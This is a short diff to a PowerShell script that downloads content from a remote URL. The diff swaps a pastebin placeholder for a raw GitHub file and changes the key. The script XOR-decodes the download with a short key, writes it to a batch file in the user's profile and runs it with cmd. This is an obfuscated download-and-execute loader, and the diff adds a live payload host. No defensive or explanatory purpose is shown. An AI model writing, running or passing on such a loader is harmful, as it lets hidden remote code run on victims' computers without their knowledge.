@@ -1,6 +1,6 @@
-$u='https://pastebin.com/raw/PASTE_ID'
-$k='secret'
-$p="$env:USERPROFILE\Desktop\output.bat"
+$u='https://raw.githubusercontent.com/Jakeryan500/a/refs/heads/main/skibidi'
+$k='moon'
+$p="$env:USERPROFILE\output.bat"
 
 $d=(iwr $u -UseBasicParsing).Content
 $o=-join([char[]]([char[]]$d|%{$i=0}{[byte][char]$_ -bxor [byte][char]$k[$i++%$k.Length]}))
@@ -8,3 +8,4 @@ $o=-join([char[]]([char[]]$d|%{$i=0}{[byte][char]$_ -bxor [byte][char]$k[$i++%$k
 $o | Out-File $p
 
     cmd /c $p
+
